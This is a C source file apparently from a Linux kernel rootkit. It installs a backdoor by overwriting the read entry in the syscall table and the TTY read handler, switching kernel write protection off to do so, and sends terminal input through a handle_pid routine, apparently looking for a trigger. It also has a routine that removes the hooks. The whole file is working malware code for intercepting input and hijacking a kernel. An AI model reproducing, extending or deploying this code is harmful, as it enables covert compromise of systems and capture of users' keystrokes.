#include <linux/tty.h>
#include <linux/delay.h>

#include "common.h"
#include "creds.h"
#include "backdoor.h"
#include "read.h"
#include "hook.h"

atomic_t tty_read_count;

ssize_t (*current_tty_read)(struct file *, char *, size_t, loff_t *);

void
backdoor_read(void)
{
    disable_protection();
    sys_calls[__NR_read] = (void *)g7_read;
    enable_protection();
}

void
backdoor_tty(void)
{
    if (!current_tty_read) {
        current_tty_read
            = ((struct file_operations *)kallsyms_lookup_name("tty_fops"))->read;

        disable_protection();
        ((struct file_operations *)kallsyms_lookup_name("tty_fops"))->read
            = (void *)g7_tty_read;
        enable_protection();
    }
}

ssize_t
g7_tty_read(struct file *file, char *buf, size_t count, loff_t *off)
{
    atomic_inc(&tty_read_count);
    ssize_t ret = current_tty_read(file, buf, count, off);
    handle_pid(current->pid, buf, count);
    atomic_dec(&tty_read_count);
    return ret;
}

void
unbackdoor(void)
{
    int cur;

    if (current_tty_read) {
        disable_protection();
        ((struct file_operations *)kallsyms_lookup_name("tty_fops"))->read
            = (void *)current_tty_read;
        enable_protection();

        while ((cur = atomic_read(&tty_read_count)) > 0)
            msleep(250);

        current_tty_read = NULL;
    } else if (sys_read) {
        disable_protection();
        sys_calls[__NR_read] = (void *)sys_read;
        enable_protection();

        // Sleeping here is very important, as without it
        // we would stall the CPU...
        while ((cur = atomic_read(&read_count)) > 0)
            msleep(250);
    }
}
